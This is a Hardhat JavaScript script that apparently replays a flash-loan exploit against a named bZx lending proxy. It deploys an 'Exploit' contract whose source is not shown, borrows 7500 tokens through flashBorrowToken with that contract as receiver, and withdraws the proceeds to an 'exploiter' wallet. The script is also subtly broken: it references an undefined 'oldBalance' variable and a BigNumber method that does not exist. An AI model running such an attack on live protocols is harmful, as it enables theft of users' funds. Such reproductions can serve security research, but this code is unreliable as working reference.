const hre = require("hardhat");
const ethers = hre.ethers;

async function main() {
  // set up two wallets
  const [owner, exploiter] = await ethers.getSigners();
  console.log(`***** Wallets\n`);
  console.log(`exploiter:\t${exploiter.address}\n\n`);

  // deploy exploit contract
  const Exploit = await ethers.getContractFactory("Exploit");
  const exploit = await Exploit.deploy();

  const initialBalance = await exploiter.provider.getBalance(exploiter.address);

  // address 0x77f973FCaF871459aa58cd81881Ce453759281bC is PROXY of
  // address 0x85CA13d8496b2D22D6518fAeB524911E096Dd7E0 which is LoanTokenLogicV4 (bZx flash loanable)
  const bZxAddress = "0x77f973FCaF871459aa58cd81881Ce453759281bC";
  const bZx = await ethers.getContractAt("LoanTokenLogicV4", bZxAddress, exploiter);

  // call flash borrow pointing at the exploit contract
  const borrowAmount = ethers.utils.parseEther("7500");
  const coder = ethers.utils.defaultAbiCoder;
  const encodedSignature = coder.encode(["string"], [""]);
  const encodedData = coder.encode(["string"], [""]);
  await bZx.flashBorrowToken(borrowAmount, exploit.address, exploit.address, encodedSignature, encodedData);

  // withdraw funds from contract
  await exploit.withdraw();

  const newBalance = await exploiter.provider.getBalance(exploiter.address);

  if (newBalance.isGreaterThan(oldBalance)) {
    console.log("you did it!");//TODO
  }
  console.log(await exploiter.provider.getBalance("0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"));

  console.log('done');
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
